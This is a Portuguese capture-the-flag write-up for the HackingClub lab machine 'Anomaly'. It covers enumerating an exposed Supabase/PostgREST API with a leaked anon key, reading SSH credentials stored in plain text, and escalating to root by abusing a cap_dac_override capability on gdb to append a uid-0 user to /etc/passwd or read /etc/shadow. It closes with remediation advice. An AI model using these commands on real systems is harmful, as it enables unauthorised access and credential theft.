# Anomaly - HackingClub

- **IP:** 172.16.15.235 (`anomaly.hc`)
- **SO:** Ubuntu 24.04.4 LTS (Noble)
- **Kernel:** 6.17.0-1009-aws (build de Mar/2026)
- **Cadeia:** Web (Supabase) → vazamento de credenciais SSH → `rhbackup` → `cap_dac_override` no gdb → **root**

---

## 1. Resumo

A máquina expõe uma plataforma de RH ("RHTech — HR Platform"), um SPA React/Vite apoiado em uma
stack **Supabase** self-hosted rodando em Docker. O acesso inicial vem do **bundle JS** (que vaza
a `anon key` do Supabase) combinado a uma **tabela exposta via PostgREST** que armazena
**credenciais SSH em texto claro**. Com isso entra-se como `rhbackup`. A escalada para root
**não usa exploit de kernel** (6.17 é imune às CVEs clássicas) e sim uma **capability mal
configurada no `gdb`** (`cap_dac_override`), que dá leitura/escrita arbitrária como root.

---

## 2. Reconhecimento

```bash
nmap -sC -sV -p- 172.16.15.235
```

| Porta | Serviço |
| ------- | --------- |
| 22 | OpenSSH |
| 80 | Apache (SPA RHTech) |
| 5432 | PostgreSQL |
| 6543 | Supavisor (pooler, `x-app-version: 2.7.4`) |
| 8000 / 8443 | Kong 3.9.1 (API gateway do Supabase → PostgREST + GoTrue) |

Stack claramente **Supabase self-hosted**: Kong na frente, PostgREST/GoTrue por trás, Postgres +
pooler expostos.

---

## 3. Acesso Inicial

### 3.1 Extração da anon key no front-end

A porta 80 serve um SPA React/Vite. O bundle JavaScript embute a configuração do Supabase:

- **Supabase URL:** `http://anomaly.hc:8000` (→ 172.16.15.235, Kong)
- **anon key:** JWT com `role: anon`, `iss: supabase`

### 3.2 Enumeração via PostgREST

Com a anon key e o header `Host: anomaly.hc` (para o Kong rotear), a API REST do Supabase responde
e expõe as tabelas:

```bash
curl -s http://172.16.15.235:8000/rest/v1/ \
  -H "Host: anomaly.hc" \
  -H "apikey: <ANON_JWT>" \
  -H "Authorization: Bearer <ANON_JWT>"
```

Tabelas expostas: **`access_logs`**, `candidates`, `positions`, `settings`.

### 3.3 Vazamento de credenciais (access_logs)

A tabela `access_logs` estava legível com a anon key e continha **credenciais SSH em texto claro**:

```bash
curl -s "http://172.16.15.235:8000/rest/v1/access_logs?select=*" \
  -H "Host: anomaly.hc" -H "apikey: <ANON_JWT>" -H "Authorization: Bearer <ANON_JWT>"
```

- Servidor de backup: `172.16.4.115:22`
- Usuário: **`rhbackup`**
- Senha: **`<REDACTED>`**
- Extras: `db_admin_user = supabase_admin`, PII de candidatos (SSN) em `candidates`.

> **Misconfig raiz:** RLS/permissões do PostgREST deixando `access_logs` legível pelo papel `anon`,
> e segredos guardados em texto claro no banco.

### 3.4 Login SSH

O servidor de backup (`172.16.4.115`) estava inalcançável a partir do alvo → as credenciais foram
reutilizadas no **próprio SSH do alvo**:

```bash
ssh rhbackup@172.16.15.235      # senha: <REDACTED>
```

Acesso obtido como `rhbackup`.

```bash
cat ~/user.txt
```

> No home havia `moc.py` — exploit **ofuscado** que usa `splice`+`pipe` contra `/usr/bin/su` aberto
> read-only (**Dirty Pipe, CVE-2022-0847**). É uma **pista falsa**: não funciona no kernel 6.17.
> Mesmo caso de `xpl.py`, `poc.sh` e `woot1337.so.2`.

---

## 4. Enumeração Local (privesc)

`uname -a` mostra kernel 6.17 — descarta Dirty Pipe, OverlayFS/GameOver(lay), nf_tables
(CVE-2024-1086), PwnKit, Looney Tunables, etc. (todos já corrigidos).

achado-chave na seção de Capabilities:

```bash
getcap -r / 2>/dev/null
# /usr/bin/gdb cap_dac_override=ep      ← VETOR
```

`cap_dac_override` ignora TODA verificação de permissão (DAC) de leitura/escrita de arquivos. Como
a flag é `e` (effective), está ativa no exec — qualquer arquivo aberto pelo gdb, inclusive
`/etc/shadow` e `/etc/passwd` (root-only), é acessível como se fôssemos root.

---

## 5. Escalada para root

O gdb embute um interpretador Python que herda a capability do processo. Basta abrir o
`/etc/passwd` em modo append e injetar um usuário uid=0 com senha conhecida.

```bash
# 1. Gerar hash de senha
openssl passwd -6 'pwn123'

# 2. Escrever no /etc/passwd usando a capability do gdb
gdb -nx -batch -ex 'py open("/etc/passwd","a").write("r00t2:$6$Vh2PwONDkhF59GbG$YZ90dI8kCigWOWisKBQzz3FCyCISvXNeX0P.zZ7JFYnVH3D0Stt9LjsJFayXgFcA5S8I67W8On6wgqD3mP4M21:0:0:root:/root:/bin/bash\n")'

# 3. Virar root
su r00t2     # senha definida no passo 1
id           # uid=0(root)
cat /root/root.txt
```

### Por que funciona

- A file capability é aplicada no `execve()`; o Python embutido roda no mesmo processo e, portanto,
  com `cap_dac_override` effective.
- `open(...,"a")` no `/etc/passwd` (root:root 0644) normalmente falharia para o uid 1001, mas a
  capability faz o kernel pular a checagem de DAC.
- Um segundo usuário com uid 0 = root pleno. `su` autentica via PAM contra a senha injetada.

### Alternativa (sem alterar passwd)

```bash
# Ler o /etc/shadow direto e quebrar o hash do root offline
gdb -nx -batch -ex 'py print(open("/etc/shadow").read())'
```

---

## 6. Remediação

- **Web/Supabase:** aplicar RLS correto; nunca deixar `access_logs` legível por `anon`; remover
  segredos em texto claro do banco; rotacionar a senha `<REDACTED>` e a anon key.
- **Privesc:** remover a capability do gdb → `setcap -r /usr/bin/gdb`. Nunca dar
  `cap_dac_override`/`cap_dac_read_search`/`cap_fowner` a binários de uso geral, ainda mais a
  debuggers que executam código arbitrário. Auditar com `getcap -r /` periodicamente.

---

## 7. Cadeia resumida

`80/Supabase` → anon key no bundle JS → PostgREST expõe `access_logs` →
**credenciais SSH em claro** → `ssh rhbackup` (user flag) →
`getcap` revela `cap_dac_override` no gdb → gdb+Python escreve uid 0 em `/etc/passwd` →
`su` → **root**.
